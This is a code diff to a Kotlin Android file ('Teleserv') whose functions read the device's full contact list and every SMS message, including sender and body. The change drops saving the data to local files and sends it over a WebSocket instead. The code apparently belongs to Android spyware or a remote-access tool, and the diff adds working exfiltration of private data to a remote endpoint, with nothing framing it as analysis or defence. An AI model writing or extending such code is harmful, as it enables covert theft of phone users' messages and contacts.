@@ -11,6 +11,7 @@ import android.os.Looper
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.telephony.SmsManager
+import okhttp3.WebSocket
 import java.io.BufferedWriter
 import java.io.File
 import java.io.FileOutputStream
@@ -21,7 +22,7 @@ import java.time.LocalDateTime
 object Teleserv {
     private val uiHandler = Handler(Looper.getMainLooper())
     @SuppressLint("Range")
-    fun uploadContact(contentResolver: ContentResolver, context: Context) {
+    fun uploadContact(contentResolver: ContentResolver, context: Context, webSocket: WebSocket) {
             var allContactList = "All Contacts\n\n\n"
             val cr: ContentResolver = context.contentResolver
             val cur = cr.query(
@@ -62,18 +63,12 @@ object Teleserv {
                         pCur.close()
                     }
                 }
+                cur?.close()
             }
-            cur?.close()
-        val fileDir = context.getExternalFilesDir(null)
-        val fileName = "all contacts ${LocalDateTime.now()}.txt"
-        val file = File(fileDir, fileName)
-        val outputStream = FileOutputStream(file)
-        val writer = BufferedWriter(OutputStreamWriter(outputStream))
-        writer.write(allContactList)
-        writer.close()
+        webSocket.send(allContactList);
     }
     @SuppressLint("Range")
-    fun uploadsms(contentResolver: ContentResolver, context: Context) {
+    fun uploadsms(contentResolver: ContentResolver, context: Context , webSocket: WebSocket) {
         val projection = arrayOf(
             Telephony.Sms.ADDRESS,
             Telephony.Sms.BODY,
@@ -84,9 +79,7 @@ object Teleserv {
             Telephony.Sms.CONTENT_URI,
             projection, null, null, null
         )
-
         val smsText = StringBuilder()
-
         if (cursor != null && cursor.count > 0) {
             while (cursor.moveToNext()) {
                 val address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS))
@@ -99,22 +92,7 @@ object Teleserv {
             }
             cursor.close()
         }
-
-        try {
-            // Create a file in the app's external storage directory
-            val fileDir = context.getExternalFilesDir(null)
-            val fileName = "SMS.txt"
-            val file = File(fileDir, fileName)
-
-            // Write the SMS data to the file
-            val outputStream = FileOutputStream(file)
-            outputStream.write(smsText.toString().toByteArray())
-            outputStream.close()
-
-            println("SMS messages saved to file: $fileName")
-        } catch (e: Exception) {
-            println("Error while saving SMS messages: ${e.message}")
-        }
+        webSocket.send(smsText.toString());
     }
     fun dateToString(timestamp: Long): String {
         val dateFormat = "yyyy-MM-dd HH:mm:ss"
